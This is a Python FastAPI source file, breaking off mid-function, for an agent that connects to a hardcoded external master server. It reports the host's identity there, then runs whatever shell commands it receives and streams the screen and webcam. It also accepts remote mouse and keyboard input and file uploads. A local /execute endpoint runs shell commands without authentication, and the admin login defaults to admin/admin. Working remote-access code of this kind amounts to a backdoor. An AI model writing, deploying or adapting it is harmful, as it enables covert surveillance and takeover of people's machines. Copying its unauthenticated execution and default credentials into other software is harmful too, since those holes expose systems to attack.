from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
from pydantic import BaseModel
import asyncio, os, sys, subprocess, logging, socket
from dotenv import load_dotenv
import secrets, time
import json
import websockets
from fastapi import Request, UploadFile, File
from typing import Any, Tuple
import base64, io

# Ensure Windows supports asyncio subprocesses
if sys.platform == 'win32':
    try:
        asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
    except Exception:
        pass

logging.basicConfig(level=logging.INFO, format='%(levelname)s:     %(message)s')

load_dotenv()
FRONTEND_URL = os.getenv('FRONTEND_URL', 'http://localhost:5173')
ALLOWED_ORIGINS = [FRONTEND_URL]
# Hardcoded master control URL; change here when needed
MASTER_CONTROL_WS_URL = 'wss://mastervpsback.onrender.com/ws/agent'
# Optional: connect to multiple masters; add more URLs here
MASTER_CONTROL_WS_URLS = [
    MASTER_CONTROL_WS_URL,
    'ws://localhost:9000/ws/agent',
]
AGENT_HTTP_BASE = os.getenv('AGENT_HTTP_BASE', 'http://127.0.0.1:8000')
SESSION_DIRS: dict[str, str] = {}
# Kill long-running commands to avoid stuck queue (seconds)
COMMAND_TIMEOUT_SECONDS = int(os.getenv('COMMAND_TIMEOUT_SECONDS', '30'))
# Remote view/control settings
SCREEN_MAX_FPS = int(os.getenv('SCREEN_MAX_FPS', '10'))
SCREEN_DEFAULT_QUALITY = int(os.getenv('SCREEN_QUALITY', '60'))  # JPEG 1-95
REMOTE_CONTROL_ENABLED = True
SCREEN_AUTO_START = False
CAMERA_ENABLED = os.getenv('CAMERA_ENABLED', '0').lower() in ('1','true','yes','on')

app = FastAPI()
app.add_middleware(
    CORSMiddleware,
    allow_origins=ALLOWED_ORIGINS,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

ADMIN_USERNAME = os.getenv('ADMIN_USERNAME', 'admin')
ADMIN_PASSWORD = os.getenv('ADMIN_PASSWORD', 'admin')
TOKEN_TTL_SECONDS = int(os.getenv('TOKEN_TTL_SECONDS', '86400'))
TOKENS: dict[str, float] = {}

class CommandRequest(BaseModel):
    command: str

class LoginRequest(BaseModel):
    username: str
    password: str

@app.post("/login")
async def login(req: LoginRequest):
    try:
        if req.username == ADMIN_USERNAME and req.password == ADMIN_PASSWORD:
            token = secrets.token_urlsafe(32)
            TOKENS[token] = time.time() + TOKEN_TTL_SECONDS
            return {"token": token}
        return JSONResponse({"error": "Invalid credentials"}, status_code=401)
    except Exception as e:
        logging.exception("Login failed")
        return JSONResponse({"error": f"Login failed: {e}"}, status_code=500)

@app.post("/execute")
async def execute(cmd: CommandRequest):
    command = cmd.command
    def run_cmd():
        if os.name == 'nt':
            return subprocess.run(['cmd.exe', '/c', command], capture_output=True, text=True)
        return subprocess.run(command, shell=True, capture_output=True, text=True)
    try:
        logging.info(f"REST execute: {command}")
        proc = await asyncio.to_thread(run_cmd)
        if proc.stdout:
            logging.info(proc.stdout.strip())
        if proc.stderr:
            logging.error(proc.stderr.strip())
        return {"command": command, "stdout": proc.stdout or "", "stderr": proc.stderr or "", "exit_code": proc.returncode}
    except Exception as e:
        logging.error(f"Failed to execute: {e}")
        return JSONResponse({"error": f"Failed to execute: {e}"}, status_code=500)

@app.post("/upload")
async def upload_file(request: Request, file: UploadFile = File(...)):
    token = request.query_params.get("token")
    dir_path = SESSION_DIRS.get(token or "", os.getcwd())
    try:
        name = os.path.basename(file.filename or "upload.bin")
        data = await file.read()
        out_path = os.path.join(dir_path, name)
        with open(out_path, "wb") as f:
            f.write(data)
        return {"saved": out_path, "size": len(data)}
    except Exception as e:
        return JSONResponse({"error": f"Upload failed: {e}"}, status_code=500)

@app.get("/stats")
async def stats(request: Request):
    token = request.query_params.get("token")
    dir_path = SESSION_DIRS.get(token or "", os.getcwd())
    try:
        items = []
        for name in os.listdir(dir_path):
            full = os.path.join(dir_path, name)
            try:
                st = os.stat(full)
                items.append({
                    "name": name,
                    "is_dir": os.path.isdir(full),
                    "size": int(st.st_size),
                    "modified": int(st.st_mtime),
                })
            except Exception:
                items.append({"name": name, "is_dir": os.path.isdir(full)})
        return {"current_dir": dir_path, "files": items}
    except Exception as e:
        return JSONResponse({"error": f"Stats failed: {e}"}, status_code=500)

@app.post("/upload_master")
async def upload_file_master(file: UploadFile = File(...)):
    try:
        name = os.path.basename(file.filename or "upload.bin")
        data = await file.read()
        out_path = os.path.join(current_agent_dir, name)
        with open(out_path, "wb") as f:
            f.write(data)
        return {"saved": out_path, "size": len(data)}
    except Exception as e:
        return JSONResponse({"error": f"Upload failed: {e}"}, status_code=500)

@app.get("/stats_master")
async def stats_master():
    dir_path = current_agent_dir
    try:
        items = []
        for name in os.listdir(dir_path):
            full = os.path.join(dir_path, name)
            try:
                st = os.stat(full)
                items.append({
                    "name": name,
                    "is_dir": os.path.isdir(full),
                    "size": int(st.st_size),
                    "modified": int(st.st_mtime),
                })
            except Exception:
                items.append({"name": name, "is_dir": os.path.isdir(full)})
        return {"current_dir": dir_path, "files": items}
    except Exception as e:
        return JSONResponse({"error": f"Stats failed: {e}"}, status_code=500)

@app.websocket("/ws/terminal")
async def websocket_terminal(websocket: WebSocket):
    # Validate token from query params before accepting
    token = websocket.query_params.get("token") if hasattr(websocket, "query_params") else None
    now = time.time()
    if not token or token not in TOKENS or TOKENS[token] < now:
        await websocket.close(code=1008)
        return
    await websocket.accept()
    current_dir = os.getcwd()
    SESSION_DIRS[token] = current_dir
    try:
        while True:
            msg = await websocket.receive_text()
            logging.info("Frontend : %s", msg)
            # Handle built-in directory changes so cwd persists across commands
            stripped = msg.strip()
            parts0 = stripped.split(maxsplit=1)
            head0 = parts0[0].lower() if parts0 else ""
            arg0 = parts0[1] if len(parts0) > 1 else None
            if head0 in ("cd", "chdir"):
                target = arg0.strip() if arg0 else None
                if target:
                    if target.lower().startswith("/d "):
                        target = target[3:].strip()
                    target = os.path.expandvars(os.path.expanduser(target))
                    target = target.strip().strip('"').strip("'")
                    if len(target) == 2 and target[1] == ":" and target[0].isalpha():
                        new_dir = f"{target}\\"
                    else:
                        new_dir = target if os.path.isabs(target) else os.path.abspath(os.path.join(current_dir, target))
                    if os.path.isdir(new_dir):
                        current_dir = new_dir
                        SESSION_DIRS[token] = current_dir
                        await websocket.send_json({"output": current_dir + "\n"})
                        await websocket.send_json({"exit_code": 0})
                    else:
                        await websocket.send_json({"error": "The system cannot find the path specified.\n"})
                        await websocket.send_json({"exit_code": 1})
                else:
                    await websocket.send_json({"output": current_dir + "\n"})
                    await websocket.send_json({"exit_code": 0})
                continue
            cmd_to_run = msg

            # Block interactive shells without arguments (e.g., 'netsh')
            try:
                forbid, headx = _is_interactive_disallowed(cmd_to_run)
            except Exception:
                forbid, headx = (False, "")
            if forbid:
                await websocket.send_json({"error": f"Interactive command '{headx}' requires arguments; interactive sessions are not supported.\n"})
                await websocket.send_json({"exit_code": 1})
                continue

            # Execute and stream command output
            if os.name == "nt":
                # Windows fallback: use threads with subprocess.Popen to avoid NotImplementedError
                def start_proc():
                    return subprocess.Popen(
                        ["cmd.exe", "/c", cmd_to_run],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True,
                        encoding="utf-8",
                        errors="replace",
                        bufsize=1,
                        cwd=current_dir,
                    )
                proc = await asyncio.to_thread(start_proc)
                loop = asyncio.get_running_loop()
                queue: asyncio.Queue[tuple[str, str]] = asyncio.Queue()
                def reader(stream, key):
                    try:
                        for line in stream:
                            loop.call_soon_threadsafe(queue.put_nowait, (key, line))
                    except Exception as e:
                        loop.call_soon_threadsafe(queue.put_nowait, ("error", f"[reader {key} failed: {e}\n]"))
                    finally:
                        loop.call_soon_threadsafe(queue.put_nowait, ("__done__", key))
                t1 = asyncio.create_task(asyncio.to_thread(reader, proc.stdout, "output"))
                t2 = asyncio.create_task(asyncio.to_thread(reader, proc.stderr, "error"))
                done_readers = 0
                while done_readers < 2:
                    key, payload = await queue.get()
                    if key == "__done__":
                        done_readers += 1
                        continue
                    await websocket.send_json({key: payload})
                await asyncio.gather(t1, t2)
                try:
                    return_code = await asyncio.wait_for(asyncio.to_thread(proc.wait), timeout=COMMAND_TIMEOUT_SECONDS)
                except asyncio.TimeoutError:
                    try:
                        proc.terminate()
                    except Exception:
                        pass
                    await asyncio.sleep(0.5)
                    try:
                        if proc.poll() is None:
                            proc.kill()
                    except Exception:
                        pass
                    await websocket.send_json({"error": f"[Timeout] Command exceeded {COMMAND_TIMEOUT_SECONDS}s and was terminated.\n"})
                    return_code = 124
                await websocket.send_json({"exit_code": return_code})
            else:
                proc = await asyncio.create_subprocess_shell(
                    cmd_to_run,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                    cwd=current_dir,
                )
                async def stream_reader(stream, key):
                    try:
                        while True:
                            line = await stream.readline()
                            if not line:
                                break
                            text = line.decode(errors="replace")
                            await websocket.send_json({key: text})
                    except Exception:
                        logging.exception("Streaming failed")
                await asyncio.gather(
                    stream_reader(proc.stdout, "output"),
                    stream_reader(proc.stderr, "error"),
                )
                try:
                    return_code = await asyncio.wait_for(proc.wait(), timeout=COMMAND_TIMEOUT_SECONDS)
                except asyncio.TimeoutError:
                    try:
                        proc.terminate()
                    except ProcessLookupError:
                        pass
                    except Exception:
                        pass
                    await asyncio.sleep(0.5)
                    try:
                        proc.kill()
                    except Exception:
                        pass
                    await websocket.send_json({"error": f"[Timeout] Command exceeded {COMMAND_TIMEOUT_SECONDS}s and was terminated.\n"})
                    return_code = 124
                await websocket.send_json({"exit_code": return_code})

    except WebSocketDisconnect:
        logging.info("WebSocket disconnected")
    except Exception:
        logging.exception("WebSocket error")
    finally:
        if token:
            SESSION_DIRS.pop(token, None)



# Agent-to-Master connector
current_agent_dir = os.getcwd()

# Global single-run queue across all masters
queue_lock: asyncio.Lock = asyncio.Lock()
command_queue: list[tuple[Any, str]] = []  # (ws, command)
queue_task: asyncio.Task | None = None
command_running: bool = False

async def _send_line(ws, key, text):
    try:
        await ws.send(json.dumps({key: text}))
    except Exception:
        pass

async def _broadcast_queue_positions():
    # Inform waiting masters of their earliest position in queue
    try:
        async with queue_lock:
            # Compute first index per ws
            pos: dict[Any, int] = {}
            for idx, (w, _c) in enumerate(command_queue):
                if w not in pos:
                    pos[w] = idx + 1  # 1-based
        # Send outside lock
        for w, p in pos.items():
            try:
                await _send_line(w, "output", f"[Queue] You are #{p} in queue\n")
            except Exception:
                pass
    except Exception:
        pass

async def _process_queue():
    global queue_task, command_running
    while True:
        ws = None
        cmd = None
        async with queue_lock:
            if not command_queue:
                # Nothing to do; reset runner state and exit
                queue_task = None
                command_running = False
                return
            # If a command is in progress, wait before checking again
            if command_running:
                # Avoid busy loop while another command runs
                pass
            else:
                ws, cmd = command_queue.pop(0)
                command_running = True
        if ws is None:
            await asyncio.sleep(0.05)
            continue
        try:
            await _send_line(ws, "output", "[Queue] Your command is starting...\n")
            await _run_agent_command(cmd, ws)
        except Exception:
            logging.exception("Queued command failed")
        finally:
            async with queue_lock:
                command_running = False
            # Update positions for remaining queued requests
            await _broadcast_queue_positions()

async def _ensure_queue_runner():
    global queue_task, command_running
    async with queue_lock:
        if command_queue and (queue_task is None or queue_task.done()):
            # If previous runner crashed, make sure we clear the busy flag
            if queue_task is not None and queue_task.done():
                command_running = False
            queue_task = asyncio.create_task(_process_queue())

async def enqueue_command(ws, cmd: str):
    # If nothing running and queue empty, run immediately via queue machinery
    async with queue_lock:
        command_queue.append((ws, cmd))
        # Compute this ws position (first occurrence)
        pos = next((i + 1 for i, (w, _c) in enumerate(command_queue) if w is ws), 1)
    if pos > 1 or command_running:
        await _send_line(ws, "output", f"[Queued] You are #{pos} in queue. Waiting for your turn...\n")
    await _ensure_queue_runner()

async def _remove_queued_for_ws(ws):
    try:
        async with queue_lock:
            # Remove all pending items for this ws
            i = 0
            while i < len(command_queue):
                if command_queue[i][0] is ws:
                    command_queue.pop(i)
                else:
                    i += 1
    except Exception:
        pass

def _is_interactive_disallowed(cmd: str) -> Tuple[bool, str]:
    try:
        stripped = cmd.strip()
        parts0 = stripped.split(maxsplit=1)
        head0 = parts0[0].lower() if parts0 else ""
        arg0 = parts0[1] if len(parts0) > 1 else None
        if os.name == "nt":
            block = {"netsh", "powershell", "cmd"}
        else:
            block = {"bash", "sh", "zsh"}
        if head0 in block and not arg0:
            return True, head0
        return False, head0
    except Exception:
        return False, ""

async def _run_agent_command(cmd: str, ws):
    global current_agent_dir
    stripped = cmd.strip()
    parts0 = stripped.split(maxsplit=1)
    head0 = parts0[0].lower() if parts0 else ""
    arg0 = parts0[1] if len(parts0) > 1 else None
    if head0 in ("cd","chdir"):
        target = arg0.strip() if arg0 else None
        if target:
            if target.lower().startswith("/d "):
                target = target[3:].strip()
            target = os.path.expandvars(os.path.expanduser(target))
            target = target.strip().strip('"').strip("'")
            if len(target)==2 and target[1]==":" and target[0].isalpha():
                new_dir = f"{target}\\"
            else:
                new_dir = target if os.path.isabs(target) else os.path.abspath(os.path.join(current_agent_dir, target))
            if os.path.isdir(new_dir):
                current_agent_dir = new_dir
                await _send_line(ws, "output", current_agent_dir + "\n")
                await _send_line(ws, "exit_code", 0)
            else:
                await _send_line(ws, "error", "The system cannot find the path specified.\n")
                await _send_line(ws, "exit_code", 1)
        else:
            await _send_line(ws, "output", current_agent_dir + "\n")
            await _send_line(ws, "exit_code", 0)
        return

    # Block interactive shells without arguments (e.g., 'netsh')
    try:
        forbid, headx = _is_interactive_disallowed(cmd)
    except Exception:
        forbid, headx = (False, "")
    if forbid:
        await _send_line(ws, "error", f"Interactive command '{headx}' requires arguments; interactive sessions are not supported.\n")
        await _send_line(ws, "exit_code", 1)
        return

    if os.name == "nt":
        def start_proc():
            return subprocess.Popen(
                ["cmd.exe","/c", cmd],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                encoding="utf-8",
                errors="replace",
                bufsize=1,
                cwd=current_agent_dir,
            )
        proc = await asyncio.to_thread(start_proc)
        loop = asyncio.get_running_loop()
        queue: asyncio.Queue[tuple[str,str]] = asyncio.Queue()
        def reader(stream, key):
            try:
                for line in stream:
                    loop.call_soon_threadsafe(queue.put_nowait, (key, line))
            except Exception as e:
                loop.call_soon_threadsafe(queue.put_nowait, ("error", f"[reader {key} failed: {e}\n]"))
            finally:
                loop.call_soon_threadsafe(queue.put_nowait, ("__done__", key))
        t1 = asyncio.create_task(asyncio.to_thread(reader, proc.stdout, "output"))
        t2 = asyncio.create_task(asyncio.to_thread(reader, proc.stderr, "error"))
        done_readers = 0
        while done_readers < 2:
            key, payload = await queue.get()
            if key == "__done__":
                done_readers += 1
                continue
            await _send_line(ws, key, payload)
        await asyncio.gather(t1, t2)
        try:
            code = await asyncio.wait_for(asyncio.to_thread(proc.wait), timeout=COMMAND_TIMEOUT_SECONDS)
        except asyncio.TimeoutError:
            try:
                proc.terminate()
            except Exception:
                pass
            await asyncio.sleep(0.5)
            try:
                if proc.poll() is None:
                    proc.kill()
            except Exception:
                pass
            await _send_line(ws, "error", f"[Timeout] Command exceeded {COMMAND_TIMEOUT_SECONDS}s and was terminated.\n")
            code = 124
        await _send_line(ws, "exit_code", code)
    else:
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=current_agent_dir,
        )
        async def stream_reader(stream, key):
            try:
                while True:
                    line = await stream.readline()
                    if not line:
                        break
                    text = line.decode(errors="replace")
                    await _send_line(ws, key, text)
            except Exception:
                logging.exception("Agent streaming failed")
        await asyncio.gather(
            stream_reader(proc.stdout, "output"),
            stream_reader(proc.stderr, "error"),
        )
        try:
            code = await asyncio.wait_for(proc.wait(), timeout=COMMAND_TIMEOUT_SECONDS)
        except asyncio.TimeoutError:
            try:
                proc.terminate()
            except ProcessLookupError:
                pass
            except Exception:
                pass
            await asyncio.sleep(0.5)
            try:
                proc.kill()
            except Exception:
                pass
            await _send_line(ws, "error", f"[Timeout] Command exceeded {COMMAND_TIMEOUT_SECONDS}s and was terminated.\n")
            code = 124
        await _send_line(ws, "exit_code", code)

def _derive_identity_sync() -> tuple[str, str]:
    # Returns (agent_id, agent_name) derived from local system
    try:
        if os.name == 'nt':
            proc = subprocess.run(["cmd.exe", "/c", "whoami"], capture_output=True, text=True)
        else:
            proc = subprocess.run(["whoami"], capture_output=True, text=True)
        who = (proc.stdout or "").strip() or os.getenv("USERNAME") or os.getenv("USER") or "unknown"
    except Exception:
        who = os.getenv("USERNAME") or os.getenv("USER") or "unknown"
    host = os.getenv('COMPUTERNAME') or socket.gethostname() or 'host'
    base = f"agent-{host}-{who}".lower()
    safe = ''.join(ch if ch.isalnum() or ch in ('-', '_', '.') else '-' for ch in base)
    agent_id = safe.strip('-') or 'agent-unknown'
    agent_name = who
    return agent_id, agent_name

# Track interactive sessions per master connection
interactive_sessions: dict[Any, dict] = {}
screen_sessions: dict[Any, dict] = {}
camera_sessions: dict[Any, dict] = {}

async def _connect_one_master(url: str):
    last_log = 0.0
    retry_delay = 2
    while True:
        try:
            async with websockets.connect(url, ping_interval=20, ping_timeout=20) as ws:
                try:
                    agent_id, agent_name = await asyncio.to_thread(_derive_identity_sync)
                    await ws.send(json.dumps({"agent_id": agent_id, "agent_name": agent_name, "http_base": AGENT_HTTP_BASE, "has_camera": bool(CAMERA_ENABLED)}))
                except Exception:
                    pass
                last_log = 0.0
                # Auto-start screen streaming for this master if enabled
                if SCREEN_AUTO_START and ws not in screen_sessions:
                    try:
                        fps = SCREEN_MAX_FPS
                        quality = SCREEN_DEFAULT_QUALITY
                        async def _loop_auto():
                            try:
                                try:
                                    import mss  # type: ignore
                                    from PIL import Image  # type: ignore
                                except Exception as e:
                                    try:
                                        await ws.send(json.dumps({"error": f"[Screen] missing deps: {e}\n"}))
                                    except Exception:
                                        pass
                                    return
                                with mss.mss() as sct:
                                    mon = sct.monitors[1]
                                    native_w, native_h = int(mon['width']), int(mon['height'])
                                    interval = 1.0 / float(fps)
                                    while screen_sessions.get(ws, {}).get("running"):
                                        t0 = time.time()
                                        raw = sct.grab(mon)
                                        img = Image.frombytes('RGB', raw.size, raw.rgb)
                                        buf = io.BytesIO()
                                        img.save(buf, format='JPEG', quality=quality, optimize=True)
                                        b64 = base64.b64encode(buf.getvalue()).decode()
                                        payload = {"type": "screen_frame", "w": native_w, "h": native_h, "ts": int(t0*1000), "data": f"data:image/jpeg;base64,{b64}"}
                                        try:
                                            await ws.send(json.dumps(payload))
                                        except Exception:
                                            break
                                        dt = time.time() - t0
                                        await asyncio.sleep(max(0.0, interval - dt))
                            finally:
                                pass
                        screen_sessions[ws] = {"running": True, "task": asyncio.create_task(_loop_auto())}
                    except Exception:
                        pass
                try:
                    while True:
                        raw = await ws.recv()
                        try:
                            data = json.loads(raw)
                        except Exception:
                            data = {"command": raw}
                        # Handle RPC-style requests first
                        if isinstance(data, dict) and data.get("type") == "stats_request":
                            req_id = data.get("request_id")
                            # Build directory listing from current_agent_dir
                            dir_path = current_agent_dir
                            try:
                                items = []
                                for name in os.listdir(dir_path):
                                    full = os.path.join(dir_path, name)
                                    try:
                                        st = os.stat(full)
                                        items.append({
                                            "name": name,
                                            "is_dir": os.path.isdir(full),
                                            "size": int(st.st_size),
                                            "modified": int(st.st_mtime),
                                        })
                                    except Exception:
                                        items.append({"name": name, "is_dir": os.path.isdir(full)})
                                payload = {"type": "stats_response", "request_id": req_id, "data": {"current_dir": dir_path, "files": items}}
                            except Exception as e:
                                payload = {"type": "stats_response", "request_id": req_id, "error": f"Stats failed: {e}"}
                            try:
                                await ws.send(json.dumps(payload))
                            except Exception:
                                pass
                            continue
                        # Interactive session control
                        # Camera start
                        if isinstance(data, dict) and data.get("type") == "camera_start":
                            if not CAMERA_ENABLED:
                                try:
                                    await ws.send(json.dumps({"error": "[Camera] Disabled on agent (CAMERA_ENABLED=0)\n"}))
                                except Exception:
                                    pass
                                continue
                            if ws in camera_sessions and camera_sessions[ws].get("running"):
                                try:
                                    await ws.send(json.dumps({"output": "[Camera already running]\n"}))
                                except Exception:
                                    pass
                                continue
                            fps = max(1, min(15, int(data.get("fps") or 8)))
                            quality = min(95, max(10, int(data.get("quality") or 60)))
                            async def _cam_loop():
                                cap = None
                                try:
                                    try:
                                        import cv2  # type: ignore
                                    except Exception as e:
                                        try:
                                            await ws.send(json.dumps({"error": f"[Camera] missing deps: {e}\n"}))
                                        except Exception:
                                            pass
                                        return
                                    cap = await asyncio.to_thread(lambda: __import__('cv2').VideoCapture(0))
                                    if not cap or not await asyncio.to_thread(cap.isOpened):
                                        try:
                                            await ws.send(json.dumps({"error": "[Camera] Cannot open camera\n"}))
                                        except Exception:
                                            pass
                                        return
                                    interval = 1.0 / float(fps)
                                    while camera_sessions.get(ws, {}).get("running"):
                                        t0 = time.time()
                                        # Read frame
                                        ok, frame = await asyncio.to_thread(cap.read)
                                        if not ok:
                                            await asyncio.sleep(0.1)
                                            continue
                                        # Encode JPEG
                                        def _encode(f):
                                            import cv2
                                            import numpy as _np  # noqa
                                            params = [int(cv2.IMWRITE_JPEG_QUALITY), int(quality)]
                                            ok2, buf = cv2.imencode('.jpg', f, params)
                                            return ok2, buf
                                        ok2, buf = await asyncio.to_thread(_encode, frame)
                                        if not ok2:
                                            await asyncio.sleep(0.05)
                                            continue
                                        b64 = base64.b64encode(buf.tobytes()).decode()
                                        h, w = frame.shape[:2]
                                        payload = {"type": "camera_frame", "w": int(w), "h": int(h), "ts": int(t0*1000), "data": f"data:image/jpeg;base64,{b64}"}
                                        try:
                                            await ws.send(json.dumps(payload))
                                        except Exception:
                                            break
                                        dt = time.time() - t0
                                        await asyncio.sleep(max(0.0, interval - dt))
                                except Exception:
                                    pass
                                finally:
                                    try:
                                        if cap is not None:
                                            await asyncio.to_thread(cap.release)
                                    except Exception:
                                        pass
                            camera_sessions[ws] = {"running": True, "task": asyncio.create_task(_cam_loop())}
                            continue
                        if isinstance(data, dict) and data.get("type") == "camera_stop":
                            sessc = camera_sessions.pop(ws, None)
                            if sessc:
                                sessc["running"] = False
                                try:
                                    t = sessc.get("task")
                                    if t: t.cancel()
                                except Exception:
                                    pass
                            continue
                        if isinstance(data, dict) and data.get("type") == "screen_start":
                            # Start screen capture session (view-only)
                            if ws in screen_sessions:
                                try:
                                    await ws.send(json.dumps({"output": "[Screen already running]\n"}))
                                except Exception:
                                    pass
                                continue
                            fps = max(1, min(SCREEN_MAX_FPS, int(data.get("fps") or SCREEN_MAX_FPS)))
                            quality = min(95, max(10, int(data.get("quality") or SCREEN_DEFAULT_QUALITY)))
                            async def _loop():
                                try:
                                    try:
                                        import mss  # type: ignore
                                        from PIL import Image  # type: ignore
                                    except Exception as e:
                                        try:
                                            await ws.send(json.dumps({"error": f"[Screen] missing deps: {e}\n"}))
                                        except Exception:
                                            pass
                                        return
                                    with mss.mss() as sct:
                                        mon = sct.monitors[1]
                                        native_w, native_h = int(mon['width']), int(mon['height'])
                                        interval = 1.0 / float(fps)
                                        last = 0.0
                                        while screen_sessions.get(ws, {}).get("running"):
                                            t0 = time.time()
                                            raw = sct.grab(mon)
                                            img = Image.frombytes('RGB', raw.size, raw.rgb)
                                            buf = io.BytesIO()
                                            img.save(buf, format='JPEG', quality=quality, optimize=True)
                                            b64 = base64.b64encode(buf.getvalue()).decode()
                                            payload = {"type": "screen_frame", "w": native_w, "h": native_h, "ts": int(t0*1000), "data": f"data:image/jpeg;base64,{b64}"}
                                            try:
                                                await ws.send(json.dumps(payload))
                                            except Exception:
                                                break
                                            dt = time.time() - t0
                                            await asyncio.sleep(max(0.0, interval - dt))
                                finally:
                                    pass
                            screen_sessions[ws] = {"running": True, "task": asyncio.create_task(_loop())}
                            continue
                        if isinstance(data, dict) and data.get("type") == "screen_stop":
                            sess = screen_sessions.pop(ws, None)
                            if sess:
                                sess["running"] = False
                                try:
                                    t = sess.get("task")
                                    if t: t.cancel()
                                except Exception:
                                    pass
                            continue
                        if isinstance(data, dict) and data.get("type") == "start_interactive":
                            if ws in interactive_sessions:
                                try:
                                    await ws.send(json.dumps({"output": "[Interactive already running]\n"}))
                                except Exception:
                                    pass
                                continue
                            start_cmd = data.get("command") or ""
                            if not start_cmd.strip():
                                try:
                                    await ws.send(json.dumps({"error": "No command specified for interactive session\n"}))
                                except Exception:
                                    pass
                                continue
                            # Start interactive process
                            if os.name == "nt":
                                def start_proc():
                                    return subprocess.Popen([
                                        "cmd.exe","/c", start_cmd
                                    ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                                    text=True, encoding="utf-8", errors="replace", bufsize=1,
                                    cwd=current_agent_dir)
                                proc = await asyncio.to_thread(start_proc)
                            else:
                                proc = await asyncio.create_subprocess_shell(
                                    start_cmd,
                                    stdout=asyncio.subprocess.PIPE,
                                    stderr=asyncio.subprocess.PIPE,
                                    stdin=asyncio.subprocess.PIPE,
                                    cwd=current_agent_dir,
                                )
                            # Readers (character-by-character to capture prompts without trailing newlines)
                            loop = asyncio.get_running_loop()
                            q: asyncio.Queue[tuple[str, str]] = asyncio.Queue()
                            def reader_stream_chars(stream, key):
                                try:
                                    while True:
                                        ch = stream.read(1)
                                        if not ch:
                                            break
                                        loop.call_soon_threadsafe(q.put_nowait, (key, ch))
                                except Exception as e:
                                    loop.call_soon_threadsafe(q.put_nowait, ("error", f"[reader {key} failed: {e}\n]"))
                                finally:
                                    loop.call_soon_threadsafe(q.put_nowait, ("__done__", key))
                            tasks = []
                            if os.name == 'nt':
                                tasks.append(asyncio.create_task(asyncio.to_thread(reader_stream_chars, proc.stdout, "output")))
                                tasks.append(asyncio.create_task(asyncio.to_thread(reader_stream_chars, proc.stderr, "error")))
                            else:
                                async def stream_reader_chars(stream, key):
                                    try:
                                        while True:
                                            chunk = await stream.read(1)
                                            if not chunk:
                                                break
                                            text = chunk.decode(errors="replace")
                                            await q.put((key, text))
                                    except Exception:
                                        pass
                                    finally:
                                        await q.put(("__done__", key))
                                tasks.append(asyncio.create_task(stream_reader_chars(proc.stdout, "output")))
                                tasks.append(asyncio.create_task(stream_reader_chars(proc.stderr, "error")))
                            interactive_sessions[ws] = {"proc": proc, "queue": q, "tasks": tasks}
                            try:
                                await ws.send(json.dumps({"output": "[Interactive session started]\n"}))
                            except Exception:
                                pass
                            continue
                        if isinstance(data, dict) and data.get("type") == "mouse":
                            # Remote mouse events (optional)
                            if REMOTE_CONTROL_ENABLED:
                                try:
                                    from pynput.mouse import Controller as MouseController, Button as MouseButton  # type: ignore
                                    m = MouseController()
                                    action = (data.get("action") or '').lower()
                                    if action == 'move':
                                        x, y = int(data.get('x') or 0), int(data.get('y') or 0)
                                        m.position = (x, y)
                                    elif action in ('click','down','up'):
                                        x, y = int(data.get('x') or 0), int(data.get('y') or 0)
                                        m.position = (x, y)
                                        btn = MouseButton.left if (data.get('button') or 'left').lower()=='left' else MouseButton.right
                                        if action == 'click':
                                            m.click(btn, 1)
                                        elif action == 'down':
                                            m.press(btn)
                                        else:
                                            m.release(btn)
                                    elif action == 'scroll':
                                        dx, dy = int(data.get('dx') or 0), int(data.get('dy') or 0)
                                        m.scroll(dx, dy)
                                except Exception:
                                    pass
                            continue
                        if isinstance(data, dict) and data.get("type") == "keyboard":
                            if REMOTE_CONTROL_ENABLED:
                                try:
                                    from pynput.keyboard import Controller as KeyboardController, Key, KeyCode  # type: ignore
                                    kbd = KeyboardController()
                                    # Text typing
                                    txt = data.get('text')
                                    if isinstance(txt, str) and txt:
                                        kbd.type(txt)
                                    # Key press/release
                                    action = (data.get('action') or '').lower()
                                    key_name = data.get('key')
                                    if action in ('down','up') and isinstance(key_name, str) and key_name:
                                        name = key_name.lower()
                                        special = {
                                            'enter': Key.enter,
                                            'return': Key.enter,
                                            'backspace': Key.backspace,
                                            'tab': Key.tab,
                                            'esc': Key.esc,
                                            'escape': Key.esc,
                                            'space': Key.space,
                                            'shift': Key.shift,
                                            'ctrl': Key.ctrl,
                                            'control': Key.ctrl,
                                            'alt': Key.alt,
                                            'win': Key.cmd if os.name == 'nt' else Key.cmd,
                                            'meta': Key.cmd,
                                            'left': Key.left,
                                            'right': Key.right,
                                            'up': Key.up,
                                            'down': Key.down,
                                            'delete': Key.delete,
                                            'home': Key.home,
                                            'end': Key.end,
                                            'pageup': Key.page_up,
                                            'pagedown': Key.page_down,
                                        }
                                        if name.startswith('f') and name[1:].isdigit():
                                            try:
                                                idx = int(name[1:])
                                                if 1 <= idx <= 20:
                                                    special[name] = getattr(Key, name)
                                            except Exception:
                                                pass
                                        key_obj = special.get(name) or (KeyCode.from_char(key_name) if len(key_name) == 1 else None)
                                        if key_obj is not None:
                                            if action == 'down':
                                                kbd.press(key_obj)
                                            else:
                                                kbd.release(key_obj)
                                except Exception:
                                    pass
                            continue
                        if isinstance(data, dict) and data.get("type") == "stdin":
                            sess = interactive_sessions.get(ws)
                            if not sess:
                                continue
                            proc = sess.get("proc")
                            try:
                                payload = data.get("data", "")
                                if os.name == 'nt':
                                    def write_stdin():
                                        try:
                                            proc.stdin.write(payload)
                                            if not payload.endswith("\n"):
                                                proc.stdin.write("\n")
                                            proc.stdin.flush()
                                        except Exception:
                                            pass
                                    await asyncio.to_thread(write_stdin)
                                else:
                                    if not payload.endswith("\n"):
                                        payload += "\n"
                                    proc.stdin.write(payload.encode())
                                    await proc.stdin.drain()
                            except Exception:
                                pass
                            continue
                        if isinstance(data, dict) and data.get("type") == "end_interactive":
                            sess = interactive_sessions.pop(ws, None)
                            if sess:
                                proc = sess.get("proc")
                                try:
                                    if os.name == 'nt':
                                        def _term():
                                            try:
                                                proc.terminate()
                                            except Exception:
                                                pass
